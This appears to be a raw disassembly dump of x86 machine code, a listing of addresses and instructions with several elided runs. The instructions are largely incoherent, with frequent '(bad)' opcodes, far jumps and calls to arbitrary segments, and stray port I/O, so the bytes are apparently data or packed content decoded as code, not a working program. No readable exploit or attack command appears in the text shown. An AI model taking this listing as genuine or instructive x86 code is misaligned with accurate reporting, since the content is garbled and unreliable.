  426a5f:	sub    DWORD PTR [edi+edx*1+0x57],edx
  426a63:	test   eax,0x5cf71876
  426a68:	pop    es
  426a69:	mov    eax,ds:0x4d8dde64
  426a6e:	mov    ecx,0xfd87be3c
  426a73:	sub    al,0xe9
  426a75:	lahf   
  426a76:	nop
  426a77:	ficomp WORD PTR [ecx-0x7e]
  426a7a:	ret    0x232c
  426a7d:	jl     0x426ac9
  426a7f:	pusha  
  426a80:	das    
  426a81:	xor    DWORD PTR [eax],ecx
  426a83:	sub    edi,0x962cb1c6
  426a89:	arpl   WORD PTR [edx+0x1318f5ec],bp
  426a8f:	mov    BYTE PTR [eax],0x0
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x4a
  426b01:	repz xchg esp,eax
  426b03:	dec    ecx
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	retf   0x3148
  426b0f:	(bad)  
  426b10:	aad    0x20
  426b12:	pop    esp
  426b13:	and    eax,0x3a786983
  426b18:	xchg   edx,eax
  426b19:	jb     0x426b5c
  426b1b:	in     eax,0xb1
  426b1d:	mov    eax,ds:0xe96238b5
  426b22:	inc    esi
  426b23:	jae    0x426b85
  426b25:	mov    edx,0xa4ff5bac
  426b2a:	add    bl,dl
  426b2c:	push   ebp
  426b2d:	cs ret 0x75ae
  426b31:	sbb    al,0xca
  426b33:	push   edi
  426b34:	jmp    0x426b06
  426b36:	inc    sp
  426b38:	mov    al,0x9a
  426b3a:	or     dh,BYTE PTR [edx+0x3a]
  426b3d:	sub    al,0x80
  426b3f:	inc    ebp
  426b40:	mov    eax,0xfb414076
  426b45:	test   al,0xfb
  426b47:	imul   ebx,DWORD PTR [esi+0x2492d500],0xffffff82
  426b4e:	cmp    eax,0x7b1cece8
  426b53:	jp     0x426b57
  426b55:	inc    edx
  426b56:	inc    esp
  426b57:	test   eax,0xfaa224f3
  426b5c:	ds es ins BYTE PTR es:[edi],dx
  426b5f:	icebp  
  426b60:	pop    edi
  426b61:	jbe    0x426b05
  426b63:	arpl   sp,bp
  426b65:	or     edi,esp
  426b67:	mov    dh,0x6d
  426b69:	xor    esp,DWORD PTR [eax-0x59ace18a]
  426b6f:	sbb    eax,0xac89214f
  426b74:	push   0xfffffffb
  426b76:	push   ss
  426b77:	psubw  mm2,QWORD PTR [esi+0x3fd48353]
  426b7e:	pop    edx
  426b7f:	push   esp
  426b80:	in     al,dx
  426b81:	push   DWORD PTR [ebp+0xd6aa47e]
  426b87:	repz push edx
  426b89:	sbb    BYTE PTR [ebx-0x6876e3e1],bl
  426b8f:	in     al,0x12
  426b91:	rep lods al,BYTE PTR ds:[esi]
  426b93:	test   eax,0xe09861be
  426b98:	(bad)  
  426b99:	lods   al,BYTE PTR ds:[esi]
  426b9a:	xchg   DWORD PTR [ebx+esi*8],esi
  426b9d:	je     0x426b86
  426b9f:	push   ebx
  426ba0:	add    eax,0xda73a6b5
  426ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ba6:	(bad)  
  426ba7:	aad    0x9d
  426ba9:	add    DWORD PTR [ebx+0x76],ebp
  426bac:	mov    ebx,0xd5afe7a3
  426bb1:	mov    bh,0x1e
  426bb3:	retf   0x20c6
  426bb6:	loopne 0x426b7c
  426bb8:	sbb    ebx,DWORD PTR [edi]
  426bba:	adc    BYTE PTR [ecx-0x145c9338],0x47
  426bc1:	ds push es
  426bc3:	cdq    
  426bc4:	call   0xa80746c
  426bc9:	cmp    eax,0x77fa5dad
  426bce:	xchg   edx,eax
  426bcf:	adc    DWORD PTR [eax+0x72],edx
  426bd2:	mov    ds:0x684ccfa3,al
  426bd7:	inc    edi
  426bd8:	dec    esp
  426bd9:	xor    esi,eax
  426bdb:	stc    
  426bdc:	mov    ecx,0x72397df5
  426be1:	inc    ebp
  426be2:	gs jmp 0x426b6b
  426be5:	pop    edx
  426be6:	enter  0x79fb,0x9d
  426bea:	sbb    DWORD PTR [esi+0x23],esp
  426bed:	push   ss
  426bee:	and    esi,DWORD PTR fs:[ebx-0x7f]
  426bf2:	pop    ebp
  426bf4:	rcr    dl,1
  426bf6:	sbb    BYTE PTR [edi-0x397053e8],dh
  426bfc:	cwde   
  426bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bfe:	jne    0x426c72
  426c00:	or     al,0x7f
  426c02:	xchg   esi,eax
  426c03:	pop    esp
  426c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c05:	xchg   ebx,eax
  426c06:	cmp    al,0x45
  426c08:	mov    dl,0x65
  426c0a:	mov    cl,0x60
  426c0c:	(bad)  
  426c0d:	mov    ecx,0x932c
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x96c43ebb
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	push   edi
  426c8d:	pushf  
  426c8e:	mov    ebx,0xb79c7ce8
  426c93:	enter  0xcb8f,0x40
  426c97:	mov    bl,0x55
  426c99:	push   0xe89886be
  426c9e:	push   0x9651b044
  426ca3:	(bad)  
  426ca4:	call   0x41b8:0x656c2bd0
  426cab:	out    dx,al
  426cac:	gs jmp 0xf7199f9c
  426cb2:	and    al,0x65
  426cb4:	int3   
  426cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cb6:	popa   
  426cb7:	sbb    edx,DWORD PTR [ecx+0x32bc30de]
  426cbd:	jbe    0x426cd8
  426cbf:	mov    dl,0xee
  426cc1:	sub    eax,0x4dc9c747
  426cc6:	push   ecx
  426cc7:	ret    
  426cc8:	lock sub dl,BYTE PTR [edx+0x52]
  426ccc:	xchg   ecx,eax
  426ccd:	test   BYTE PTR [eax+0x2125683b],dh
  426cd3:	neg    BYTE PTR [edi]
  426cd5:	mov    eax,0xa696cac4
  426cda:	call   0xc20b9a49
  426cdf:	or     BYTE PTR [eax+0x79f158a2],ch
  426ce5:	xchg   edx,eax
  426ce6:	adc    DWORD PTR [edi+0x33],0x0
  426cea:	xchg   DWORD PTR [ebx],ebp
  426cec:	dec    esp
  426ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cee:	stos   DWORD PTR es:[edi],eax
  426cef:	xor    edi,eax
  426cf1:	jecxz  0x426d31
  426cf3:	xchg   edx,eax
  426cf4:	(bad)  
  426cf5:	mov    ch,0xd3
  426cf7:	push   ebx
  426cf8:	mov    bh,cl
  426cfa:	jne    0x426d31
  426cfc:	or     eax,0x77b2356b
  426d01:	jle    0x426d3b
  426d03:	ins    BYTE PTR es:[edi],dx
  426d04:	jns    0x426cd6
  426d06:	jecxz  0x426d5d
  426d08:	jnp    0x426d25
  426d0a:	sahf   
  426d0b:	fldcw  WORD PTR [ebx+0x49]
  426d0e:	inc    ebp
  426d0f:	jl     0x426ca7
  426d11:	data16 fdivr DWORD PTR [ecx+eax*1]
  426d15:	sbb    al,0xf3
  426d17:	(bad)  
  426d18:	push   ebp
  426d19:	ret    
  426d1a:	(bad)
  426d1d:	int    0x20
  426d1f:	dec    esi
  426d20:	push   ss
  426d21:	pop    edi
  426d22:	or     al,0xd
  426d24:	xchg   ebx,eax
  426d25:	push   esi
  426d26:	std    
  426d27:	ret    
  426d28:	and    eax,0xa86b4b05
  426d2d:	xchg   dl,ah
  426d2f:	pop    ecx
  426d30:	or     ebp,ebx
  426d32:	mov    eax,ds:0xc08a4854
  426d37:	imul   esi,DWORD PTR [ebx+0x72],0x9d5474cc
  426d3e:	bnd jl 0x426d9b
  426d41:	mov    ecx,0x3337ea3
  426d46:	mov    ah,0x93
  426d48:	add    eax,0x90ebf79e
  426d4d:	mov    edi,0x567541da
  426d52:	lds    ebx,FWORD PTR [eax-0x1e940b9]
  426d58:	ds and al,0x68
  426d5b:	or     edi,ebp
  426d5d:	ret    
  426d5e:	jbe    0x426d1b
  426d60:	pop    esi
  426d61:	lds    ecx,FWORD PTR [esi]
  426d63:	add    bh,0x15
  426d66:	in     eax,0x62
  426d68:	pop    es
  426d69:	pop    esp
  426d6a:	mov    ah,0x51
  426d6c:	sbb    ecx,esp
  426d6e:	mov    ch,0x86
  426d70:	mov    ah,0xe9
  426d72:	fisub  WORD PTR [ebp+0x4e]
  426d75:	inc    ebx
  426d76:	push   es
  426d77:	mov    bh,0xec
  426d79:	mov    ecx,0x9b507fe3
  426d7e:	push   es
  426d7f:	or     eax,0x7e40dad0
  426d84:	ds cmp eax,edi
  426d87:	fs sti 
  426d89:	sbb    al,0xae
  426d8b:	(bad)
  426d8f:	pop    ebx
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x4a0c:0xc7c2ecf9
  426e01:	ins    DWORD PTR es:[edi],dx
  426e02:	jp     0x426dda
  426e04:	add    al,0x9f
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	push   ds
  426e0d:	sub    al,0x2b
  426e0f:	stos   BYTE PTR es:[edi],al
  426e10:	and    al,0xad
  426e12:	jns    0x426e66
  426e14:	ds cld 
  426e16:	dec    ebp
  426e17:	add    esp,esi
  426e19:	pxor   mm7,QWORD PTR [eax]
  426e1c:	xchg   ebx,eax
  426e1d:	repz out dx,al
  426e1f:	push   eax
  426e20:	mov    ebx,ebp
  426e22:	and    al,0x2b
  426e24:	inc    ecx
  426e25:	jecxz  0x426e2e
  426e27:	fimul  WORD PTR [edi+0x2fdd5427]
  426e2d:	popa   
  426e2e:	addr16 mov edx,ebp
  426e31:	push   edx
  426e32:	xor    ebp,DWORD PTR [edi-0x40ff492b]
  426e38:	add    eax,0xfff95550
  426e3d:	pop    eax
  426e3e:	sbb    al,BYTE PTR [ebx]
  426e40:	fcom   QWORD PTR [edi+0x43]
  426e43:	shr    DWORD PTR [edi],cl
  426e45:	rcr    BYTE PTR [edi+esi*4+0x8],0xd5
  426e4a:	dec    eax
  426e4b:	fisttp DWORD PTR [esi]
  426e4d:	push   ebx
  426e4e:	rcr    DWORD PTR [ecx+0x1337344e],cl
  426e54:	push   cs
  426e55:	dec    edx
  426e56:	adc    DWORD PTR [ecx],0xce1838e5
  426e5c:	cmp    al,BYTE PTR [edi-0x6d]
  426e5f:	inc    ebp
  426e60:	popa   
  426e61:	jecxz  0x426eb7
  426e63:	fidiv  WORD PTR [eax-0x1fa95b84]
  426e69:	dec    edx
  426e6a:	and    BYTE PTR [edx-0x78b6ec67],0x4e
  426e71:	jo     0x426e8d
  426e73:	int    0x2e
  426e75:	pop    edi
  426e76:	dec    ecx
  426e77:	inc    ecx
  426e78:	cwde   
  426e79:	jnp    0x426e4f
  426e7b:	xor    esi,DWORD PTR [ebp+0x3e]
  426e7e:	jo     0x426e40
  426e80:	test   eax,0x1a703447
  426e85:	arpl   WORD PTR [edx+0x5a4fd9f0],si
  426e8b:	rol    DWORD PTR [edi+ebx*2-0x4dc9276b],1
  426e92:	sbb    BYTE PTR [edx],bl
  426e94:	inc    edx
  426e95:	fistp  WORD PTR [edx+0x1bfa9bda]
  426e9b:	lock push es
  426e9d:	mov    ebp,0xc45a42c2
  426ea2:	cmp    edx,esp
  426ea4:	push   ebp
  426ea5:	mov    al,ds:0x409fe605
  426eaa:	dec    eax
  426eab:	or     eax,0x1b6d0f06
  426eb0:	add    eax,0x41a8d76d
  426eb5:	sbb    eax,0x42145edb
  426eba:	imul   ecx,DWORD PTR [eax-0x408b702f],0xc3d8857f
  426ec4:	outs   dx,BYTE PTR ds:[esi]
  426ec5:	dec    edi
  426ec6:	push   eax
  426ec7:	push   cs
  426ec8:	fwait
  426ec9:	xchg   edx,eax
  426eca:	cwde   
  426ecb:	aas    
  426ecc:	cmp    ecx,DWORD PTR [ecx+edx*8]
  426ecf:	or     ebx,DWORD PTR [ebx-0x38]
  426ed2:	int3   
  426ed3:	mov    ebx,0x25bfd9a4
  426ed8:	aaa    
  426ed9:	jl     0x426e71
  426edb:	scas   al,BYTE PTR es:[edi]
  426edc:	cmp    cl,ah
  426ede:	pop    ebx
  426edf:	mov    bl,0xd9
  426ee1:	fldenv [edx]
  426ee3:	outs   dx,BYTE PTR ds:[esi]
  426ee4:	xor    cl,dh
  426ee6:	inc    edi
  426ee7:	xchg   eax,esp
  426ee9:	shr    DWORD PTR [ebp+0xf910c40],cl
  426eef:	mov    WORD PTR [ecx+ebp*1+0x31d43e18],ds
  426ef6:	in     al,dx
  426ef7:	les    esp,FWORD PTR [esi-0x75]
  426efa:	push   ss
  426efb:	jae    0x426eef
  426efd:	inc    DWORD PTR [edx+0x17216733]
  426f03:	aam    0x91
  426f05:	push   esi
  426f06:	addr16 pop ss
  426f08:	aam    0x88
  426f0a:	ss xor eax,0x9fa1276d
	...
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [eax+ecx*4+0x807480a],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	push   0x4a5ce1e2
  426f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f92:	lahf   
  426f93:	aam    0xf5
  426f95:	call   0x669ff69d
  426f9a:	stos   DWORD PTR es:[edi],eax
  426f9b:	cmp    ah,0xb5
  426f9e:	inc    esp
  426f9f:	gs retf 
  426fa1:	push   es
  426fa2:	out    dx,eax
  426fa3:	push   ecx
  426fa4:	hlt    
  426fa5:	and    BYTE PTR [ecx+0x70],bh
  426fa8:	mov    ecx,0x456f8b1b
  426fad:	lods   al,BYTE PTR ds:[esi]
  426fae:	xchg   BYTE PTR [eax-0xa35a4ba],bl
  426fb4:	add    al,BYTE PTR [ebx-0x79126b94]
  426fba:	(bad)  
  426fbb:	cli    
  426fbc:	loope  0x426fdb
  426fbe:	lock test al,0x8f
  426fc1:	jle    0x426fe1
  426fc3:	ja     0x426fe9
  426fc5:	xor    esp,DWORD PTR [eax+0x213aaee2]
  426fcb:	rcl    BYTE PTR cs:0x8cd509db,cl
  426fd2:	data16 jns 0x426f95
  426fd5:	sti    
  426fd6:	dec    ebp
  426fd7:	ss daa 
  426fd9:	jmp    0x427008
  426fdb:	cmp    eax,0x58a569e4
  426fe0:	stos   BYTE PTR es:[edi],al
  426fe1:	stos   DWORD PTR es:[edi],eax
  426fe2:	aad    0x49
  426fe4:	xor    dl,dh
  426fe6:	cwde   
  426fe7:	jle    0x426f9e
  426fe9:	and    BYTE PTR [ebp+0x12],dh
  426fec:	lods   eax,DWORD PTR ds:[esi]
  426fed:	in     al,dx
  426fee:	lods   al,BYTE PTR ds:[esi]
  426fef:	mov    eax,ds:0xe49f9947
  426ff4:	inc    edi
  426ff5:	mov    eax,ds:0xd3d5ec66
  426ffa:	mov    ebp,0xc623acc7
  426fff:	test   eax,0x810a964
  427004:	pop    edi
  427005:	add    ah,al
  427007:	adc    BYTE PTR [ecx+ebp*2],dh
  42700a:	idiv   BYTE PTR [esi+0x48]
  42700d:	xor    dh,0xc0
  427010:	mov    ds,WORD PTR [ebx+edi*8]
  427013:	dec    esp
  427014:	sub    DWORD PTR [eax],ecx
  427016:	lock push es
  427018:	sbb    eax,0x9cb0edc9
  42701d:	gs jle 0x42701f
  427020:	clc    
  427021:	dec    esi
  427022:	ins    BYTE PTR es:[edi],dx
  427023:	xor    esi,edx
  427025:	les    edx,FWORD PTR [ebx+ebx*1]
  427028:	adc    eax,0xff67f08a
  42702d:	push   ebx
  42702e:	dec    ebx
  42702f:	inc    edx
  427030:	mov    dl,0x1e
  427032:	imul   ebx,DWORD PTR [esi],0x7fdc2cb3
  427038:	outs   dx,DWORD PTR ds:[esi]
  427039:	mov    esp,0x9e899f50
  42703e:	jp     0x427032
  427040:	mov    dl,0x40
  427042:	pop    edi
  427043:	mov    esi,esi
  427045:	pop    eax
  427046:	xor    al,0x89
  427048:	fwait
  427049:	fwait
  42704a:	lods   eax,DWORD PTR ds:[esi]
  42704b:	xchg   edx,eax
  42704c:	(bad)  
  42704e:	sbb    BYTE PTR [edx],ch
  427050:	push   eax
  427051:	inc    eax
  427052:	scas   al,BYTE PTR es:[edi]
  427053:	adc    eax,0x8420fae9
  427058:	xor    bl,dh
  42705a:	adc    BYTE PTR [edx+ecx*1+0x1e],cl
  42705e:	adc    eax,DWORD PTR [ebx]
  427060:	mov    eax,ds:0xd1cdc820
  427065:	fs popa 
  427067:	jae    0x427078
  427069:	(bad)  
  42706a:	scas   eax,DWORD PTR es:[edi]
  42706b:	or     bl,BYTE PTR [ebx+ecx*2+0x54]
  42706f:	and    dl,bl
  427071:	jo     0x4270b0
  427073:	test   DWORD PTR [ecx+0x1b],ebx
  427076:	push   ebp
  427077:	sub    eax,0x6e9e205
  42707c:	(bad)  
  42707d:	pop    ecx
  42707e:	mov    eax,ds:0x6646fcba
  427083:	popa   
  427084:	dec    ecx
  427085:	push   esi
  427086:	xor    ebp,ebp
  427088:	pop    ss
  427089:	and    DWORD PTR [edx-0x35d5ba7b],0xffffff93
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x4fa79d96
  427102:	into   
  427103:	cld    
  427104:	or     al,0xa1
  427106:	add    DWORD PTR [eax],eax
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	sbb    al,0x8c
  42710e:	ss xor al,0x24
  427111:	push   edx
  427112:	in     eax,dx
  427113:	mov    DWORD PTR [ebp-0x4592516b],eax
  427119:	and    ecx,edx
  42711b:	cdq    
  42711c:	inc    esi
  42711d:	sub    ebp,edi
  42711f:	push   0x77b0e226
  427124:	or     al,0xd5
  427126:	add    eax,0xbad24284
  42712b:	or     ah,BYTE PTR [ebp+0x757d214b]
  427131:	aam    0x8
  427133:	jmp    0xc951:0xdc92f20
  42713a:	std    
  42713b:	lds    edi,FWORD PTR [ebx+0x547713c1]
  427141:	loope  0x4271b1
  427143:	out    dx,eax
  427144:	xchg   ebx,eax
  427145:	sbb    DWORD PTR [eax],ebx
  427147:	popa   
  427148:	nop
  427149:	xlat   BYTE PTR ds:[ebx]
  42714a:	mov    dh,0x5d
  42714c:	pop    eax
  42714d:	mov    edi,0x883d67a4
  427152:	pop    ds
  427153:	fsub   st,st(4)
  427155:	inc    edx
  427156:	mov    edi,0x4c3e6c72
  42715b:	push   edi
  42715c:	lods   eax,DWORD PTR ds:[esi]
  42715d:	shl    BYTE PTR [eax-0xf],1
  427160:	push   ds
  427161:	and    dl,BYTE PTR [edx-0x27]
  427164:	or     ebp,DWORD PTR [ecx]
  427166:	dec    ebp
  427167:	adc    al,BYTE PTR [edx+0x79695e1d]
  42716d:	cmc    
  42716e:	hlt    
  42716f:	cmp    al,0xfb
  427171:	dec    ebx
  427172:	dec    ebp
  427173:	mov    ah,0xdc
  427175:	mov    al,ds:0xf399d582
  42717a:	sbb    DWORD PTR [ecx+edx*8],ebx
  42717d:	mov    ?,ecx
  42717f:	push   esp
  427180:	adc    DWORD PTR [ecx+0x46],0x3c
  427184:	(bad)  
  427185:	fcmovne st,st(5)
  427187:	call   DWORD PTR [ebx]
  427189:	jecxz  0x42717b
  42718b:	mov    edx,0x3f5c7076
  427190:	cli    
  427191:	dec    edi
  427192:	mov    al,ds:0xd41414e4
  427197:	clc    
  427198:	retf   
  427199:	and    DWORD PTR [edi+0x959ece6],eax
  42719f:	mov    WORD PTR [eax-0x62695cef],ds
  4271a5:	scas   al,BYTE PTR es:[edi]
  4271a6:	call   0xfe91:0x82db4b5a
  4271ad:	sbb    DWORD PTR [edx],ecx
  4271af:	push   cs
  4271b0:	pop    esi
  4271b1:	jns    0x427167
  4271b3:	xchg   ebx,eax
  4271b4:	xchg   edi,eax
  4271b5:	cld    
  4271b6:	dec    esp
  4271b7:	in     al,0xf3
  4271b9:	and    eax,eax
  4271bb:	or     esi,DWORD PTR [edi-0x49151f3e]
  4271c1:	dec    esi
  4271c2:	pop    ds
  4271c3:	mov    dh,0x43
  4271c5:	sub    al,0xca
  4271c7:	and    DWORD PTR [eax],ecx
  4271c9:	int    0x30
  4271cb:	sbb    al,0x5b
  4271cd:	sbb    dh,BYTE PTR [esi+0x5491dc49]
  4271d3:	aaa    
  4271d4:	(bad)  
  4271d5:	(bad)  
  4271d6:	jl     0x42718f
  4271d8:	mov    BYTE PTR [ebx+0x17],ch
  4271db:	push   esp
  4271dc:	sub    al,0x65
  4271de:	mov    al,ds:0xd9d5e6c8
  4271e3:	and    dl,cl
  4271e5:	or     ah,ch
  4271e7:	std    
  4271e8:	push   0xdc37e802
  4271ed:	xchg   ax,ax
  4271ef:	pop    DWORD PTR [esi]
  4271f1:	jnp    0x4271b5
  4271f3:	cmp    DWORD PTR [esi+0x6d],eax
  4271f6:	call   0xde36bf1f
  4271fb:	test   al,0xb4
  4271fd:	and    al,0xee
  4271ff:	pop    es
  427200:	xchg   ebp,eax
  427201:	loop   0x42725c
  427203:	xchg   edi,eax
  427204:	in     al,0x1f
  427206:	fucomp st(5)
  427208:	mov    esp,0x58d9933e
  42720d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42720e:	popa   
  42720f:	mov    edi,0x0
	...
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x3383d18,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	shr    DWORD PTR [ebp+ecx*4+0x36],0x12
  427291:	pop    ecx
  427292:	repnz cwde 
  427294:	out    0xad,eax
  427296:	mov    esp,0x7e74cd56
  42729b:	xchg   DWORD PTR [ebp+ebx*2+0x7a],edx
  42729f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272a0:	outs   dx,DWORD PTR ds:[esi]
  4272a1:	and    esp,esi
  4272a3:	pop    ecx
  4272a4:	cmp    al,0xd0
  4272a6:	leave  
  4272a7:	dec    esi
  4272a8:	sti    
  4272a9:	loop   0x427324
  4272ab:	cmp    eax,DWORD PTR [esi+0x2e]
  4272ae:	out    dx,eax
  4272af:	cmp    eax,ecx
  4272b1:	out    0x21,al
  4272b3:	inc    esi
  4272b4:	fchs   
  4272b6:	or     al,0x95
  4272b8:	jle    0x4272a9
  4272ba:	loope  0x427328
  4272bc:	xchg   ecx,eax
  4272bd:	xor    ch,BYTE PTR [ecx-0x7f]
  4272c0:	sub    edx,esp
  4272c2:	outs   dx,BYTE PTR ds:[esi]
  4272c3:	nop
  4272c4:	add    eax,0x58337467
  4272c9:	push   ds
  4272ca:	into   
  4272cb:	call   0x72519e54
  4272d0:	out    dx,al
  4272d1:	inc    edx
  4272d2:	fisttp WORD PTR [edi-0x3dabcc9c]
  4272d8:	call   FWORD PTR [edx]
  4272da:	outs   dx,DWORD PTR ds:[esi]
  4272db:	(bad)  
  4272dc:	std    
  4272dd:	(bad)  
  4272de:	(bad)  
  4272df:	or     BYTE PTR [edx-0x22192e87],0x83
  4272e6:	mov    esp,0x49243f8
  4272eb:	mov    ah,0x4d
  4272ed:	and    bh,BYTE PTR [ebx+0x5194d3f6]
  4272f3:	jb     0x42734a
  4272f5:	xor    BYTE PTR [ebp+0x51],dl
  4272f8:	dec    eax
  4272f9:	pop    ebx
  4272fa:	cli    
  4272fb:	ret    0x4026
  4272fe:	push   ss
  4272ff:	mov    edx,0x89a0c9a
  427304:	lds    edx,FWORD PTR [ebx+0x19]
  427307:	adc    edi,DWORD PTR [edx+0x50b4f4c2]
  42730d:	pop    ecx
  42730e:	rcr    dl,1
  427310:	jmp    0x3c3b:0x4c831fe9
  427317:	adc    al,0x19
  427319:	and    eax,DWORD PTR ds:[esi]
  42731c:	inc    edx
  42731d:	loop   0x427358
  42731f:	sub    DWORD PTR ds:0x8518cd48,esp
  427325:	stc    
  427326:	inc    ebx
  427327:	and    ebp,ebx
  427329:	mov    dl,0xee
  42732b:	pop    esp
  42732c:	mov    bh,BYTE PTR [eax]
  42732e:	xor    al,0xe9
  427330:	xlat   BYTE PTR ds:[ebx]
  427331:	and    al,0x6d
  427333:	rol    BYTE PTR [esi+0x3a],0x87
  427337:	out    dx,eax
  427338:	call   0xeb3:0xcca26e6e
  42733f:	daa    
  427340:	adc    al,0x4d
  427342:	mov    dl,0x7a
  427344:	jecxz  0x42730a
  427346:	sub    eax,0x170ea169
  42734b:	lock cmp dh,BYTE PTR [ebx]
  42734e:	test   al,0xcf
  427350:	mov    dl,0x4e
  427352:	out    0x2,al
  427354:	mov    fs,WORD PTR [esi+0x5c]
  427357:	enter  0x1b55,0x1b
  42735b:	mov    dl,BYTE PTR [ebx]
  42735d:	mov    ecx,0xa6022537
  427362:	cld    
  427363:	lods   al,BYTE PTR ds:[esi]
  427364:	xor    edx,edx
  427366:	add    ebp,DWORD PTR [esp+eiz*8+0x4a]
  42736a:	mov    ds:0x8206b0c0,al
  42736f:	ja     0x4272fe
  427371:	jno    0x4273f2
  427373:	cld    
  427374:	out    0xe1,al
  427376:	cmp    DWORD PTR [eax+0x148d2076],ebp
  42737c:	packssdw mm6,QWORD PTR [esi+0x6123dc56]
  427383:	ds pusha 
  427385:	mov    esi,0x6c92eafe
  42738a:	jl     0x42733b
  42738c:	jbe    0x427409
  42738e:	aaa    
  42738f:	mov    ah,0x0
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    esi,ecx
  427401:	pop    ds
  427402:	call   DWORD PTR [eax+0x1a314]
  427408:	add    al,0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	mov    dl,0x22
  42740e:	sub    BYTE PTR [esi+ebx*1+0x48],0xb8
  427413:	jnp    0x4273e4
  427415:	push   edx
  427416:	sbb    DWORD PTR [eax],esi
  427418:	ret    0x708a
  42741b:	fdivr  DWORD PTR [edi-0x62]
  42741e:	aas    
  42741f:	pop    ebp
  427420:	xor    ch,BYTE PTR [eax+0x13e495ac]
  427426:	inc    BYTE PTR [edx-0x38]
  427429:	cmc    
  42742a:	jg     0x427451
  42742c:	inc    esp
  42742d:	mov    esp,0x5af90766
  427432:	scas   al,BYTE PTR es:[edi]
  427433:	les    ebp,FWORD PTR [eax]
  427435:	sub    ebx,edi
  427437:	mov    BYTE PTR [ebx-0x3c],dl
  42743a:	or     ah,ah
  42743c:	ja     0x427496
  42743e:	scas   eax,DWORD PTR es:[edi]
  42743f:	int    0x76
  427441:	xchg   edi,eax
  427442:	push   cs
  427443:	test   DWORD PTR [edi+0x5c],ebp
  427446:	adc    BYTE PTR [esi-0x79],0x62
  42744a:	dec    ebx
  42744b:	jne    0x427438
  42744d:	out    dx,eax
  42744e:	(bad)  
  427450:	xor    DWORD PTR ds:[edx],ecx
  427453:	scas   eax,DWORD PTR es:[edi]
  427454:	mov    ebp,0xad2cfa3c
  427459:	push   ss
  42745a:	inc    esi
  42745b:	ret    0x280d
  42745e:	sbb    dl,BYTE PTR [edi*1+0x380d60f9]
  427465:	xlat   BYTE PTR ds:[ebx]
  427466:	pop    ss
  427467:	addr16 movd edi,mm6
  42746b:	mov    al,ds:0xfb795e0
  427470:	out    dx,al
  427471:	sub    dh,BYTE PTR [ebp+0x68afac4a]
  427477:	jl     0x427469
  427479:	repnz pop ss
  42747b:	addr16 dec edi
  42747d:	jmp    0x68f7d381
  427482:	nop
  427483:	mov    ebx,fs
  427485:	imul   ebx,DWORD PTR [edi-0x1845a304],0x3bfb48bf
  42748f:	addr16 ja 0x42741c
  427492:	es call 0x2a294b07
  427498:	(bad)
  42749c:	adc    BYTE PTR [ebp+0x1762c347],cl
  4274a2:	lea    ebx,[eax-0x2b44690]
  4274a8:	int3   
  4274a9:	or     al,0xc1
  4274ab:	test   ah,cl
  4274ad:	imul   eax,DWORD PTR [esi+ebx*8+0x71],0x9196767a
  4274b5:	aam    0x10
  4274b7:	jmp    0x42750d
  4274b9:	sub    cl,ch
  4274bb:	jo     0x42748a
  4274bd:	fucomip st,st(2)
  4274bf:	jno    0x42750a
  4274c1:	mov    bl,0xb8
  4274c3:	aas    
  4274c4:	div    dl
  4274c6:	nop
  4274c7:	or     eax,0x1500d52
  4274cc:	push   es
  4274cd:	cmp    ecx,0x844204f3
  4274d3:	adc    ebp,DWORD PTR [edi-0x18]
  4274d6:	push   esi
  4274d7:	and    cl,ch
  4274d9:	cdq    
  4274da:	mov    esi,0xd36a297
  4274df:	cld    
  4274e0:	dec    edi
  4274e1:	jae    0x427535
  4274e3:	outs   dx,BYTE PTR ds:[esi]
  4274e4:	ja     0x4274cb
  4274e6:	pop    ecx
  4274e7:	cmp    eax,0x5471c5ef
  4274ec:	ret    
  4274ed:	(bad)  
  4274ee:	cmp    DWORD PTR [ebx],eax
  4274f0:	(bad)  
  4274f2:	jbe    0x42752e
  4274f4:	(bad)  
  4274f5:	fsub   QWORD PTR [ebp+0x954315c]
  4274fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274fc:	iret   
  4274fd:	(bad)
  427500:	retf   0x60ea
